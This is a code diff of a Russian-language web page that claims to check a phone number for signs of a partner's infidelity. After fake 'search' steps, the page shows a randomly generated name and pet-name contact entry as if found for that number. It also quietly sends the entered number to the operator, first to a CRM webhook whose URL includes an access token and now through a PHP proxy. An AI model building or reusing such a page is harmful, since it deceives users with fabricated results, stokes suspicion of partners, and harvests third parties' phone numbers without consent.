@@ -433,7 +433,7 @@
     const loadingText = document.getElementById("loading-text");
     const progress = document.getElementById("progress");
     const resultBox = document.getElementById("result");
-    const notifyUrl = "https://crm.finist.com/rest/25656/61uieccsi2xm4xdd/im.notify";
+    const notifyProxyUrl = "notify_proxy.php";
 
     const loadingSteps = [
       "Проверка открытых источников...",
@@ -442,16 +442,25 @@
       "Формирование отчета..."
     ];
 
-    const femaleEntries = [
-      { nick: "@lina.sunsets", place: "Telegram / Заметки", note: "«Сказала, что занята учебой, а сама снова до ночи в караоке»" },
-      { nick: "@sofia.urbanx", place: "Instagram / Истории", note: "«Если спросит, где была, скажу: с подругой на йоге»" },
-      { nick: "@anya.wave", place: "VK / Черновики", note: "«Новый поклонник лучше прежнего, но пока держу в секрете»" }
+    const femaleNames = ["Катя", "Алина", "София", "Марина", "Лиза", "Вика", "Оля"];
+    const maleNames = ["Алексей", "Сергей", "Илья", "Дмитрий", "Максим", "Артем", "Роман"];
+
+    const femaleContactNotes = [
+      "Детка",
+      "Малышка",
+      "Катя Любовь",
+      "Нежная",
+      "Любимка",
+      "Солнышко"
     ];
 
-    const maleEntries = [
-      { nick: "@roma.north", place: "Telegram / Личное", note: "«Обещал, что только работа, а в итоге матч и бар до двух»" },
-      { nick: "@nik.dragon", place: "VK / Сохраненное", note: "«Главное не перепутать, кому какой подарок пообещал»" },
-      { nick: "@ivan.sonic", place: "Notes / iCloud", note: "«Пишет, что любит, но все еще активен в знакомствах»" }
+    const maleContactNotes = [
+      "Милый",
+      "Любимый",
+      "Малыш",
+      "Сереженька",
+      "Котик",
+      "Родной"
     ];
 
     function clampPhone(value) {
@@ -469,17 +478,14 @@
     }
 
     async function sendPhoneNotification(phone) {
-      const payload = new URLSearchParams({
-        to: "25656",
-        message: phone
-      });
+      const payload = new URLSearchParams({ phone });
 
       try {
-        await fetch(notifyUrl, {
+        await fetch(notifyProxyUrl, {
           method: "POST",
-          mode: "no-cors",
           headers: {
-            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
+            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
+            "X-Requested-With": "XMLHttpRequest"
           },
           body: payload.toString()
         });
@@ -545,14 +551,14 @@
           return;
         }
 
-        const entry = gender === "female" ? randomItem(femaleEntries) : randomItem(maleEntries);
+        const oppositeName = gender === "female" ? randomItem(maleNames) : randomItem(femaleNames);
+        const contactNote = gender === "female" ? randomItem(maleContactNotes) : randomItem(femaleContactNotes);
         resultBox.classList.add("active");
         resultBox.innerHTML = `
           <h2 class="result-title found">Найдена неоднозначная запись</h2>
-          <p class="result-meta">Профиль: ${phone}</p>
-          <p class="result-meta">Ник: ${entry.nick}</p>
-          <p class="result-meta">Источник: ${entry.place}</p>
-          <p class="note">${entry.note}</p>
+          <p class="result-meta">Телефон: ${phone}</p>
+          <p class="result-meta">Имя: ${oppositeName}</p>
+          <p class="note">Запись контакта: ${contactNote}</p>
         `;
       }, 3000);
     });
